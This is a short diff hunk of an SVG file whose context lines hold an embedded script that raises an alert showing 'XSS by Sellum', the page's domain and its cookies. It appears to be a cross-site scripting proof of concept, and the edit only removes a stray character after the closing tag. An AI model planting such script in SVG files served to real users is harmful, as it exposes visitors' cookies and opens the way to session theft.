@@ -6,4 +6,4 @@
    <script type="text/javascript">
       alert('XSS by Sellum\n'+document.domain+'\n'+document.cookie);
    </script>
-</svg>y
+</svg>
